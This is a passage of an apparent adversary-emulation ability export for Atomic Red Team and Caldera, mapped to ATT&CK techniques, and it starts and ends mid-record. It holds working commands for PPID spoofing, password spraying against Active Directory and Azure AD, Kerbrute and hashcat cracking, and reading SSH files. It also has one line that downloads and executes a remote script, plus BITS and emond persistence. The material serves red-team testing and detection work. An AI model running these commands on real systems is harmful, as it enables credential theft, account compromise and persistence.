PID Spoofing", "ability_id": "d0966749d457cb6218a8cd5ee5128ea2", "technique_id": "T1134.004", "tactic": "multiple", "requirements": [], "name": "Parent PID Spoofing - Spawn from Current Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-Process -FilePath $Env:windir\\System32\\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Parent PID Spoofing", "ability_id": "4e9bac619326378b219b3635c9a91b94", "technique_id": "T1134.004", "tactic": "multiple", "requirements": [], "name": "Parent PID Spoofing - Spawn from New Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Spawns a notepad.exe process as a child of the current process.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Parent PID Spoofing", "ability_id": "9ac97b0e88af420a8c767a7512985895", "technique_id": "T1134.004", "tactic": "multiple", "requirements": [], "name": "Parent PID Spoofing - Spawn from Specified Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Spawnd a process as a child of the first accessible svchost.exe process.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Parent PID Spoofing", "ability_id": "aa40e8fe704a97fb7f7a5a02e9334824", "technique_id": "T1134.004", "tactic": "multiple", "requirements": [], "name": "Parent PID Spoofing - Spawn from svchost.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["8b38ee_calc.dll", "124a70_PPID-Spoof.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"calculator\" -ErrorAction Ignore; Stop-Process -Name \"iexplore\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ". 124a70_PPID-Spoof.ps1; $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"8b38ee_calc.dll\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Parent PID Spoofing", "ability_id": "434e3cfb32590973acfc2cad9c3b523a", "technique_id": "T1134.004", "tactic": "multiple", "requirements": [], "name": "Parent PID Spoofing using PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for valid SSH commands in the config file", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ssh", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.ssh.cmd"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "pip install stormssh && storm list", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ssh", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.ssh.cmd"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data from Local System", "ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f", "technique_id": "T1005", "tactic": "collection", "requirements": [], "name": "Parse SSH config", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View the known_hosts file", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cat ~/.ssh/known_hosts", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat ~/.ssh/known_hosts", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Parse SSH known_hosts", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Bruteforce a single user's password from a wordlist\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd $env:temp; .\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Guessing", "ability_id": "dcf01b96aca3771f0afc86357cbe5c6d", "technique_id": "T1110.001", "tactic": "credential-access", "requirements": [], "name": "Password Brute User using Kerbrute Tool", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "ntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "9de217b5623080a6bc898c636b1e599d", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Password Change on Directory Service Restore Mode (DSRM) Account", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["c5068b_sam.txt", "cab59f_password.lst"], "parsers": [], "cleanup": ["del %temp%\\hashcat6.7z >nul 2>&1 && del %temp%\\7z1900.exe >nul 2>&1 && del %temp%\\7z /Q /S >nul 2>&1 && del %temp%\\hashcat-unzip /Q /S >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. && %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Cracking", "ability_id": "16d35ea694e0568c1fee03936e448865", "technique_id": "T1110.002", "tactic": "credential-access", "requirements": [], "name": "Password Cracking with Hashcat", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Password Policy Discovery", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "pwpolicy getaccountpolicies", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/pam.d/common-password", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net accounts", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Password Policy", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Password Policy Discovery for a domain", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net accounts /domain", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery for a domain", "ability_id": "2946edba-54d8-11eb-ae93-0242ac130002", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Password Policy for a domain", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "c285cfeaf0c226d3d2b3812726dbe3a8", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password Spray (DomainPasswordSpray)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) { ; } else {Write-Host -NoNewLine \"Reading Users.\"; $netOutput = net users /domain; $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]); $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {;   if($usercount -ge $userLimit){break};   $line = $line.trim();   $line = $line -split '\\s\\s+';   foreach ($user in $line){;     if($usercount -ge $userLimit){break};     Add-Content $env:Temp\\usersdpsLight.txt $user;     $usercount = $usercount + 1;     }  ; }; Write-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"};  ;  function Invoke-dpsLight ($Password, $userlist) {; $users = Get-Content $userlist; $Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName; foreach ($User in $users) {;   $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password);   if ($Domain_check.name -ne $null) {;     Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\";   };   else { Write-Host \". \" -NoNewline}; }; Write-Host -ForegroundColor green \"Finished\"; }; Invoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "279d24eeb12b40e4547945accf59ca62", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password Spray Invoke-DomainPasswordSpray Light", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "import-module \"$env:temp\\MSOLSpray.ps1\"; Invoke-MSOLSpray -UserList \"$env:temp\\T1110.003UserList.txt\" -Password \"P@ssword1\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "c98d344fed27267f83450731071922aa", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["01c596_parse_net_users.bat"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if not exist %temp%\\users.txt  ( call ) ELSE ( 01c596_parse_net_users.bat ) &&   &&  @FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "4f3f0cbca49ee581e3296d16f559c725", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password Spray all Domain Users", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test a single password against a list of users\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd $env:temp; .\\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\passwordspray.txt password132", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "749175da6f9c4fc4609df39c8f98fca2", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password Spray using Kerbrute Tool", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $DomainUsers | Foreach-Object {;   $user = $_;   $password = 'P@ssw0rd!';   $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account ${user}.\";     $conn.bind();     Write-Host \" [!] ${user}:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of password spraying\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "a59dbd1a2ac17d69455248e7d91231bc", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; ($Users = Get-AzureADUser -All $true) > $null; Disconnect-AzureAD > $null; $PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force; $Users | Foreach-Object {;   $user = $_.UserPrincipalName;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword;   try {;     Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\";     Connect-AzureAD -Credential $Credential 2>&1> $null;     Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\";     Disconnect-AzureAD > $null;   } catch {;     Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\";   }; }; Write-Host \"End of password spraying\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "baf7e695c46eda5497fc648d976054a6", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "Password spray all Azure AD users with a single password", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Summary of permission and security groups", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "gpresult /R", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "groups", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "groups", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "Permission Groups Discovery", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Permission Groups Discovery\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "ced42979f76b8fc19c1afffad66beed5", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "Permission Groups Discovery (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-ADPrincipalGroupMembership administrator | select name", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "72089a2bd4a6a6f792f996d39e6b9366", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Permission Groups Discovery PowerShell (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-localgroup; Get-LocalGroupMember -Name \"Administrators\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "f5b4c02bae169cb3a62ac26bb80321d6", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "Permission Groups Discovery PowerShell (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["docker stop t1069_container; docker rmi -f t1069"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/; docker run --name t1069_container  -d -t t1069; docker exec t1069_container ./test.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "6920475188a41452389e254b61f745b4", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "Permission Groups Discovery for Containers- Local Groups", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\bitsadmin3_flag.ps1 >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "bitsadmin.exe /create AtomicBITS && bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin3_flag.ps1 && bitsadmin.exe /setnotifycmdline AtomicBITS C:\\Windows\\system32\\notepad.exe NULL && bitsadmin.exe /resume AtomicBITS && ping -n 5 127.0.0.1 >nul 2>&1 && bitsadmin.exe /complete AtomicBITS", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "BITS Jobs", "ability_id": "5f939e65285f8e67507359887d2109a2", "technique_id": "T1197", "tactic": "multiple", "requirements": [], "name": "Persist, Download, & Execute", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d6d565_T1546.014_emond.plist"], "parsers": [], "cleanup": ["sudo rm /etc/emond.d/rules/T1546.014_emond.plist; sudo rm /private/var/db/emondClients/T1546.014"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo cp \"d6d565_T1546.014_emond.plist\" /etc/emond.d/rules/T1546.014_emond.plist; sudo touch /private/var/db/emondClients/T1546.014", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Emond", "ability_id": "5043cd5dca66ce6b455b4aa793f0f0d5", "technique_id": "T1546.014", "tactic": "multiple", "requirements": [], "name": "Persistance with Event Monitor - emond", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": 